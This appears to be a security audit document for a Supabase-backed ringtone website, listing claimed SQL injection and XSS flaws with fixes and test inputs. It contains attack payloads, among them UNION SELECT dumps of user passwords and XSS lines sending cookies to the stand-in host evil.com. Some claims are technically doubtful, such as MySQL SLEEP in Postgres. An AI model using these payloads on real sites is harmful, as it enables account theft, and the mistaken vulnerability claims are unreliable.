# 🚨 CRITICAL: SQL Injection & XSS Vulnerabilities

## Current Vulnerabilities

### 1. **SQL Injection in Search** (CRITICAL - 10/10)

**Location**: `app/search/page.tsx` lines 98, 119, 149

```typescript
// VULNERABLE CODE:
.ilike('title', `%${query}%`)           // Line 98
.ilike('movie_name', `%${query}%`)      // Line 119
.or(`singers.ilike.%${query}%,music_director.ilike.%${query}%`) // Line 149
```

**Problem**: User input directly interpolated into SQL query

**Exploit Example**:
```javascript
// Attacker types in search box:
query = "'; DROP TABLE ringtones; --"

// Becomes:
.ilike('title', `%'; DROP TABLE ringtones; --%`)
```

**Impact**:
- Database dump
- Data deletion
- Unauthorized access
- Complete database compromise

### 2. **SQL Injection in Artist Pages** (CRITICAL - 10/10)

**Location**: `app/tamil/actors/[actor_name]/page.tsx` line 71

```typescript
// VULNERABLE CODE:
.ilike('tags', `%${actorName}%`)
```

**Location**: `app/tamil/music-directors/[artist_name]/page.tsx` line 44

```typescript
// VULNERABLE CODE:
.ilike('music_director', `%${artistName}%`)
```

### 3. **XSS in User Profiles** (HIGH - 9/10)

**Problem**: User-generated content displayed without sanitization
- User names
- Ringtone titles
- Comments (if any)
- Profile bios

**Exploit Example**:
```javascript
// Attacker sets username to:
username = "<script>fetch('https://evil.com?cookie='+document.cookie)</script>"

// When displayed:
<p>{username}</p> // XSS executes!
```

### 4. **XSS in Search Results** (HIGH - 8/10)

**Location**: `app/search/page.tsx` line 266, 283, etc.

```typescript
// Potentially vulnerable:
<p className="font-bold text-white text-sm truncate">{item.movie_name}</p>
```

If `movie_name` contains malicious HTML/JS, it could execute.

## Attack Scenarios

### Scenario 1: Database Dump via Search
```sql
-- Attacker searches for:
' UNION SELECT id, email, password FROM users --

-- Query becomes:
SELECT * FROM ringtones WHERE title ILIKE '%' UNION SELECT id, email, password FROM users --%'
```

### Scenario 2: Cookie Theft via XSS
```html
<!-- Attacker sets profile name to: -->
<img src=x onerror="fetch('https://evil.com?c='+document.cookie)">

<!-- When profile is viewed, cookies are stolen -->
```

### Scenario 3: Phishing via Stored XSS
```html
<!-- Attacker uploads ringtone with title: -->
<a href="https://fake-tamilring.com/login">Click here for free premium!</a>

<!-- Users click and enter credentials on fake site -->
```

## Supabase Protection Status

### ✅ What Supabase DOES Protect:
- **Parameterized Queries**: `.eq()`, `.gte()`, `.lte()` are safe
- **RLS Policies**: Row-level security prevents unauthorized access
- **Type Safety**: TypeScript helps catch some errors

### ❌ What Supabase DOES NOT Protect:
- **`.ilike()` with string interpolation**: VULNERABLE
- **`.or()` with string interpolation**: VULNERABLE  
- **Raw SQL in filters**: VULNERABLE
- **XSS in displayed content**: NOT PROTECTED

## Required Fixes

### Fix 1: Use Parameterized Queries (IMMEDIATE)

**Before (VULNERABLE)**:
```typescript
.ilike('title', `%${query}%`)
```

**After (SAFE)**:
```typescript
.ilike('title', `%${query.replace(/[%_]/g, '\\$&')}%`)
// OR use textSearch for full-text search:
.textSearch('title', query, { type: 'websearch' })
```

### Fix 2: Sanitize User Input (IMMEDIATE)

```typescript
function sanitizeInput(input: string): string {
  return input
    .replace(/[<>\"']/g, '') // Remove HTML chars
    .replace(/[%_]/g, '\\$&') // Escape SQL wildcards
    .trim()
    .substring(0, 100); // Limit length
}

// Use:
const safeQuery = sanitizeInput(query);
.ilike('title', `%${safeQuery}%`)
```

### Fix 3: Implement XSS Protection (IMMEDIATE)

```typescript
import DOMPurify from 'isomorphic-dompurify';

// Sanitize before displaying:
<p>{DOMPurify.sanitize(userContent)}</p>

// OR use React's built-in escaping (already does this by default)
<p>{userContent}</p> // Safe if not using dangerouslySetInnerHTML
```

### Fix 4: Content Security Policy (ALREADY DONE ✅)

Your CSP already helps prevent XSS:
```
script-src 'self' 'nonce-{random}'
```

## Supabase Best Practices

### ✅ SAFE Query Patterns:

```typescript
// 1. Exact match (safe)
.eq('id', userId)

// 2. Range queries (safe)
.gte('year', 2000)
.lte('year', 2020)

// 3. Array contains (safe)
.contains('tags', ['Love'])

// 4. Full-text search (RECOMMENDED)
.textSearch('title', query, { 
  type: 'websearch',
  config: 'english' 
})
```

### ❌ UNSAFE Query Patterns:

```typescript
// 1. String interpolation in ilike (VULNERABLE)
.ilike('title', `%${userInput}%`)

// 2. String interpolation in or (VULNERABLE)
.or(`column.ilike.%${userInput}%`)

// 3. Raw SQL (VERY VULNERABLE)
.rpc('raw_sql', { query: userInput })
```

## Implementation Priority

| Priority | Task | Risk | Effort |
|----------|------|------|--------|
| 🔴 P0 | Sanitize search input | Critical | 30 min |
| 🔴 P0 | Fix artist page queries | Critical | 30 min |
| 🔴 P0 | Audit all `.ilike()` calls | Critical | 1 hour |
| 🟡 P1 | Implement input validation | High | 2 hours |
| 🟡 P1 | Add XSS protection | High | 1 hour |
| 🟢 P2 | Migrate to textSearch | Medium | 4 hours |

## Testing

### SQL Injection Tests:
```javascript
// Test 1: Basic injection
query = "' OR '1'='1"

// Test 2: UNION attack
query = "' UNION SELECT * FROM users --"

// Test 3: Blind injection
query = "' AND SLEEP(5) --"

// Test 4: Wildcard escape
query = "%_%"
```

### XSS Tests:
```javascript
// Test 1: Script tag
username = "<script>alert('XSS')</script>"

// Test 2: Event handler
username = "<img src=x onerror=alert('XSS')>"

// Test 3: JavaScript URL
username = "<a href='javascript:alert(1)'>Click</a>"

// Test 4: Data URL
username = "<iframe src='data:text/html,<script>alert(1)</script>'>"
```

## References

- [Supabase Security Best Practices](https://supabase.com/docs/guides/database/postgres/row-level-security)
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [OWASP XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [Supabase Full-Text Search](https://supabase.com/docs/guides/database/full-text-search)
